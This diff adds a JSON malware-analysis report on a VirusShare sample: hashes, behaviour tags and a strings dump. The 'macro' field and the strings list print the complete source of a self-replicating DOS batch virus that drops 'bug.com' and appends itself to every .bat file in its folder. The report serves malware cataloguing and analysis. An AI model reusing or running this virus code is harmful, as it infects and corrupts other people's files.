@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "\b": "May use special characters such as backspace to obfuscate code when printed on the console",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nif exist bug.com goto infection\necho 1\ufffd\ufffd\ufffdG1\u06f3H\ufffd\ufffd1\ufffdJ\ufffd\u0006\ufffd\ufffd\ufffd!t\n:G\u0002t\u00198\ufffdt\u0011\ufffd\ufffd\ufffd!F:\u0017t\ufffd:\u0011t\ufffd1\ufffd\ufffd\ufffd\u0002\ufffd!\t\ufffd\ufffd\ufffdu\b\ufffd\u0017\ufffd!\ufffd\u0011\ufffd!\ufffd\u01b4L\ufffd!>bug.tmp\ncopy bug.tmp /a bug.com >nul\nif exist %0.bat set name=%0.bat\nif exist %0 set name=%0\nfor %%a in (*.bat) do call %name% %%a\ndel bug.*\ngoto start\n:infection\nbug <%1 >nul\nif errorlevel 255 goto end\nbug <%1 >bug.tmp\nbug <%name% >%1\ncopy %1+bug.tmp %1 >nul\necho :end>>%1\ngoto end\n:start\necho on\n:\ufffd\n@echo \u0007    Don't panic !\u0007\n@echo It's batch file virus !\n:end\n\u001a"
+    },
+    "filename": "VirusShare_0ff0f5f53f208fe26dbb764e8cf7bc14",
+    "filesize": 506,
+    "filetype": "data",
+    "hashes": {
+        "md5": "0ff0f5f53f208fe26dbb764e8cf7bc14",
+        "sha1": "e349a809e30280d6fac93655080cbf3a64908fde",
+        "sha256": "b311eb14f6a786e9ef06a8feb9751891125cac39ac8f9f58776bead2b86e0507"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if exist bug.com goto infection",
+            "echo 1G1\u06f3H1J",
+            "!\u01b4L!>bug.tmp",
+            "copy bug.tmp /a bug.com >nul",
+            "if exist %0.bat set name=%0.bat",
+            "if exist %0 set name=%0",
+            "for %%a in (*.bat) do call %name% %%a",
+            "del bug.*",
+            "goto start",
+            ":infection",
+            "bug <%1 >nul",
+            "if errorlevel 255 goto end",
+            "bug <%1 >bug.tmp",
+            "bug <%name% >%1",
+            "copy %1+bug.tmp %1 >nul",
+            "echo :end>>%1",
+            "goto end",
+            ":start",
+            "echo on",
+            "@echo ",
+            "    Don't panic !",
+            "@echo It's batch file virus !",
+            ":end"
+        ],
+        "file": {
+            "!\u01b4L!>bug.tmp": "Temporary",
+            "bug <%1 >bug.tmp": "Temporary"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.275604",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
